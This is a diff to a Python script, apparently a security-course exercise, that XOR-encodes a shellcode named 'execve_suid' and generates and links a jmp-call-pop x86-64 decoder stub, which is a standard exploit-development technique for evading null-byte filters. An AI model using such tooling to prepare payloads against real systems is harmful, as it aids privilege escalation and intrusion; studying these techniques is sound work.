@@ -11,7 +11,8 @@ SUCCESS = "[SUCCES] "
 dir = './'
 shellcode = "execve_suid"
 encoded   = "wished_encoding"
-asmres    = "res.asm"
+asmres    = "ress.asm"
+executable = "exec"
 
 def get_shellcode(file_path):
     result = subprocess.run(['objdump', '-s', file_path], stdout=subprocess.PIPE)
@@ -71,18 +72,34 @@ def ensure_no_null_bytes(code, what):
 
 # ecrire le code assembler
 def write_assembly(mask, encoding, file_path):
-    with open(file_path, 'r') as f:
+    with open(file_path, 'w') as f:
+        f.write("\t.global _start\n\t.text\n_start:\n\tjmp trois\nun:\n\tpop %rsi\ndeux:\n")
+        i = 0
+        while i < len(mask) - 4:
+            f.write(f"\txorl $0x{mask[i + 3]:02x}{mask[i + 2]:02x}{mask[i + 1]:02x}{mask[i + 0]:02x}, (%rsi)\n\tadd $4, %rsi\n")
+            i += 4
+        while i < len(mask):
+            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi)\n\tinc %rsi\n")
+            i += 1        
+        f.write("\tjmp quatre\ntrois:\n\tcall un\nquatre:\n\t.byte ")
         
+        for i in range(len(encoding)):
+            if i == len(encoding) - 1:
+                f.write(f"0x{encoding[i]:02x}")
+            else:
+                f.write(f"0x{encoding[i]:02x}, ")
+                
+        f.write("\n")
+    print(SUCCESS + f"Assembly code written in {file_path}")
 
-
-
-
-
-
-
-
-
-
+def compiler_assembler(file_path, executable):
+    result = subprocess.run(['as', file_path, '-o', file_path + '.o'], stdout=subprocess.PIPE)
+    result = subprocess.run(['ld', file_path + '.o', '-o', executable], stdout=subprocess.PIPE)
+    if result.returncode != 0:
+        print(ERROR + "Compilation failed")
+        exit(1)
+    else:
+        print(SUCCESS + "Compilation succeeded")
 
 if __name__ == '__main__':
     shellcode_data = get_shellcode(dir + shellcode)
@@ -103,6 +120,7 @@ if __name__ == '__main__':
     ensur_XOR_isCorrect(shellcode_data, encoding, mask)
 
     write_assembly(mask, encoding, dir + asmres)
+    compiler_assembler(dir + asmres, dir + executable)
 
 
 
